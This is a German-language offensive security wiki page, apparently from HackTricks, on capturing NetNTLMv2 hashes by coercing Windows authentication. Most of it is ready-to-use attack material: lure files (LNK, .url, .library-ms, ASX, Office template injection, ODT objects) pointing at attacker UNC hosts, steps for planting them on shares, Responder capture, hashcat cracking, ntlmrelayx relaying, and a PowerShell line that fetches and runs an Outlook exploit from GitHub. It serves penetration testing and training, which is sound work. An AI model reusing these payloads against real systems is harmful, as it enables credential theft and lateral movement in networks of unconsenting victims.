# Orte zum Stehlen von NTLM-Credentials

{{#include ../../banners/hacktricks-training.md}}

**Prüfe all die großartigen Ideen von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) – vom Herunterladen einer Microsoft-Word-Datei aus dem Internet bis zur Quelle des NTLM-Leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Beschreibbare SMB-Freigabe + durch Explorer ausgelöste UNC-Köder (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **Schreibzugriff auf eine Freigabe hast, die Benutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deine UNC-Adresse verweisen (z. B. `\\ATTACKER\share`). Das Anzeigen des Ordners löst **implizite SMB-Authentifizierung** aus und leakt einen **NetNTLMv2-Hash** an deinen Listener.<sup>[[1]](#references)</sup>

1. **Köder generieren** (umfasst SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/usw.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Platziere sie auf der beschreibbaren Freigabe** (in einem beliebigen Ordner, den das Opfer öffnet):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Mithören und cracken**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows kann mehrere Dateien gleichzeitig aufrufen; alles, was Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keine Klicks.

### Windows Media Player-Wiedergabelisten (.ASX/.WAX)

Wenn du ein Ziel dazu bringen kannst, eine Windows Media Player-Wiedergabeliste zu öffnen oder in der Vorschau anzuzeigen, die du kontrollierst, kannst du Net-NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad verweist. WMP versucht, die referenzierten Medien über SMB abzurufen, und authentifiziert sich dabei implizit.<sup>[[3]](#references)[[4]](#references)</sup>

Beispiel-Payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Sammel- und Crack-Vorgang:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-eingebetteter .library-ms-NTLM-leak (CVE-2025-24071/24055)

Windows Explorer verarbeitet .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Verweist die Bibliotheksdefinition auf einen entfernten UNC-Pfad (z. B. \\attacker\share), genügt es, die .library-ms-Datei im ZIP aufzurufen oder zu durchsuchen: Explorer listet den UNC-Pfad auf und sendet dabei eine NTLM-Authentifizierung an den Angreifer. Dadurch entsteht ein NetNTLMv2-Hash, der offline geknackt oder möglicherweise weitergeleitet werden kann.<sup>[[2]](#references)</sup>

Minimale .library-ms-Datei mit Verweis auf einen UNC-Pfad des Angreifers

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operative Schritte
- Erstelle die .library-ms-Datei mit dem obigen XML (setze deine IP/Hostname).
- Zippe sie (unter Windows: Senden an → ZIP-komprimierter Ordner) und übermittle die ZIP-Datei an das Ziel.
- Starte einen NTLM-Capture-Listener und warte, bis das Opfer die .library-ms-Datei aus der ZIP-Datei öffnet.


### Outlook-Kalendererinnerung: Soundpfad (CVE-2023-23397) – Zero-Click-Net-NTLMv2-Leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Eigenschaft auf einen UNC-Pfad verwies (z. B. \\attacker\share\alert.wav), stellte Outlook beim Auslösen der Erinnerung eine Verbindung zur SMB-Freigabe her und leakte dabei den Net-NTLMv2 des Benutzers – ganz ohne Klick. Dies wurde am 14. März 2023 gepatcht, ist aber für ältere/unveränderte Systeme und die historische Incident Response weiterhin hochrelevant.<sup>[[5]](#references)</sup>

Schnelle Exploitation mit PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener-Seite:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notizen
- Ein Opfer muss lediglich Outlook für Windows geöffnet haben, wenn die Erinnerung ausgelöst wird.
- Der Leak liefert Net-NTLMv2, das sich für Offline-Cracking oder Relay eignet (nicht für Pass-the-Hash).


### .LNK/.URL symbolbasierter Zero-Click-NTLM-Leak (CVE‑2025‑50154 – Umgehung von CVE‑2025‑24054)

Windows Explorer rendert Verknüpfungssymbole automatisch. Neuere Untersuchungen haben gezeigt, dass es selbst nach Microsofts Patch vom April 2025 für UNC-Symbolverknüpfungen weiterhin möglich war, NTLM-Authentifizierung ohne Klicks auszulösen, indem das Verknüpfungsziel auf einem UNC-Pfad gehostet und das Symbol lokal belassen wurde (der Patch-Bypass erhielt die CVE-2025-50154). Schon das Anzeigen des Ordners veranlasst Explorer, Metadaten vom Remote-Ziel abzurufen und dabei NTLM an den SMB-Server des Angreifers zu senden.<sup>[[6]](#references)</sup>

Minimale Internetverknüpfungs-Payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Shortcut-Payload (.lnk) per PowerShell programmieren:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery-Ideen
- Lege die Verknüpfung in ein ZIP-Archiv und bringe das Opfer dazu, darin zu navigieren.
- Platziere die Verknüpfung auf einer beschreibbaren Freigabe, die das Opfer öffnen wird.
- Kombiniere sie mit anderen Köderdateien im selben Ordner, damit der Explorer die Elemente in der Vorschau anzeigt.

### No-click .LNK-NTLM-leak über den ExtraData-Iconpfad (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten bereits beim **Anzeigen/in der Vorschau** (Rendern des Symbols), nicht erst bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke die Shell dazu veranlassen, einen Iconpfad aufzulösen und **beim Laden** auf das Dateisystem zuzugreifen. Ist der Pfad remote, wird dabei ausgehendes NTLM ausgelöst.

Wichtige Auslösebedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einschließen (Voraussetzung für die Routine zur Aktualisierung des Symbols).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einschließen.
- Der Loader erweitert Umgebungsvariablen in `TargetUnicode` und ruft `PathFileExistsW` für den resultierenden Pfad auf.

Wird `TargetUnicode` zu einem UNC-Pfad aufgelöst (z. B. `\\attacker\share\icon.ico`), löst bereits das bloße Anzeigen eines Ordners mit der Verknüpfung eine ausgehende Authentifizierung aus. Derselbe Ladepfad kann auch durch **Indizierung** und **AV-Scans** ausgelöst werden und stellt damit eine praktische No-click-Angriffsfläche für einen leak dar.<sup>[[7]](#references)</sup>

Im Projekt **LnkMeMaybe** stehen Recherche-Tools (Parser/Generator/UI) zur Verfügung, mit denen sich diese Strukturen ohne die Windows-GUI erstellen und untersuchen lassen.<sup>[[8]](#references)</sup>


### WebDAV-Auth-Coercion / Validierung von Zugangsdaten über `davclnt.dll,DavSetCookie`

Der native **WebDAV-Client** lässt sich missbrauchen, um die aktuelle Anmeldesitzung zur Authentifizierung bei einem beliebigen **HTTP/WebDAV**-Endpunkt zu zwingen:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Warum das nützlich ist:
- Gegen einen **vom Angreifer kontrollierten WebDAV-Server** kann dies **NTLM über HTTP** auslösen, ohne einen eigenen Client bereitzustellen.
- Gegen **interne Hosts** ist dies eine unauffällige Möglichkeit, zu **überprüfen, wo gestohlene Anmeldedaten akzeptiert werden**, bevor man sich lateral weiterbewegt.<sup>[[9]](#references)</sup>
- Der Befehl ist eine gute Alternative, wenn **SMB-Egress gefiltert** wird, **HTTP/WebDAV** aber weiterhin erreichbar ist.

Hinweise zum Betrieb:
- Der Dienst **WebClient** muss auf dem Quellhost ausgeführt werden.
- `rundll32.exe` lädt `davclnt.dll` und lässt Windows die WebDAV-Authentifizierung mit den **Anmeldedaten des aktuellen Benutzers** durchführen.<sup>[[10]](#references)</sup>
- Wenn Sie auf eine Infrastruktur verweisen, die Sie kontrollieren, verwenden Sie einen NTLM-fähigen HTTP-Listener/Relay wie:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Aus Detection-Sicht sind wiederholte Ausführungen von `rundll32.exe davclnt.dll,DavSetCookie` gegen viele interne Systeme ein starkes Signal für **Credential-Validierung / Vorbereitung einer spray-artigen lateralen Bewegung** und nicht für normales Nutzerverhalten.<sup>[[9]](#references)[[11]](#references)</sup>

### Remote-Benachrichtigungs-URIs für WebDAV-NTLM-Coercion

Wenn eine Anwendung remote konfigurierte Popup- oder Web-View-Adressen dereferenziert, kann eine `file://`-Adresse ausgehende Authentifizierung erzwingen, **ohne dass ein Dokument geöffnet oder eine ausführbare Payload ausgeführt wird**. Im AOMEI-Fall verwies eine Ein-Pixel-Benachrichtigung auf einen Remote-DavWWWRoot-WebDAV-Pfad. Windows versuchte, sich über integrierte Authentifizierung an dieser Adresse zu authentifizieren und legte dabei eine NetNTLMv2-Challenge-Response offen. Auslöser war die URI-Dereferenzierung, nicht die Sichtbarkeit des Popups; dies hängt weiterhin vom URI-Handler der Anwendung, dem [Windows-WebClient-Verhalten](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) und der Richtlinie für ausgehende Authentifizierung ab.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Im Gegensatz zur oben beschriebenen command-basierten Coercion erfordert dieser Einstiegspunkt die Kontrolle über eine [Software-Benachrichtigungskonfiguration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Das Ein-Pixel-Fenster und die hohe Priorität zeigen, dass eine unauffällige Benachrichtigung den Client dennoch dazu bringen kann, die URI zu dereferenzieren.<sup>[[16]](#references)</sup>

### Office-Remote-Template-Injection (.docx/.dotm), um NTLM zu erzwingen

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn du die angefügte Vorlage auf einen UNC-Pfad setzt, authentifiziert sich das Öffnen des Dokuments über SMB.

Minimale Änderungen an DOCX-Beziehungen (innerhalb von word/):

1) Bearbeite word/settings.xml und füge den Verweis auf die angefügte Vorlage hinzu:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deinen UNC-Pfad:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Packe es erneut als .docx und liefere es aus. Starte deinen SMB-Capture-Listener und warte, bis die Datei geöffnet wird.

### Externes ODT-Objekt für SMB-Authentifizierung

Wenn ein Dokument-Upload-Pfad `.odt` akzeptiert, das Ziel aber keine Office-`.docx`-Dateien öffnet, verwende statt einer Office-Vorlage ein externes OpenDocument-Objekt. Metasploits `auxiliary/fileformat/odt_badodt` erzeugt ein ODT, dessen `content.xml` eine `draw:object`-Referenz enthält, die beim Öffnen geladen wird, wie im Beispiel unten. Setze `LHOST` auf den SMB-Listener, lade das ODT über den zulässigen Workflow hoch und fange die ausgehende NetNTLMv2-Antwort ab, wenn ein Benutzer oder Dokumentprozessor es öffnet. Eine Prüfung der Dateinamenerweiterung untersucht diese eingebettete URL nicht; eingehende NTLM-Beschränkungen auf dem Ziel verhindern nicht zwangsläufig ausgehende Authentifizierung.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Für Ideen nach dem Capture zum Relaying oder Missbrauch von NTLM siehe:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Beschreibbare Freigabe als Köder + Responder-Erfassung → NetNTLMv2 knacken → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP-.library‑ms-Auth-leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 zu DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP-NTLM-leak → NTFS-Junction zu Webroot-RCE → FullPowers + GodPotato zu SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM-Schwachstellen: Ungepatchte Privilegieneskalationsbedrohungen bei Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft behebt Outlook-EoP (CVE‑2023‑23397) und erklärt den NTLM-leak über PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-Click, ein NTLM: Umgehung des Microsoft-Sicherheitspatches (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Eine Untersuchung von CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec-LnkMeMaybe-Tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wenn der IT-Support anruft: Analyse einer ModeloRAT-Kampagne von Teams bis zur Domain-Kompromittierung](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h-Header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows-Rundll32-WebDAV-Anfrage](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Interessante Orte zum Stehlen von NetNTLM-Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT-NTLM-Erfassung durch externes Objekt](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group und Mandiant – Untersuchung kurzlebiger Manipulationen der Lieferkette](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
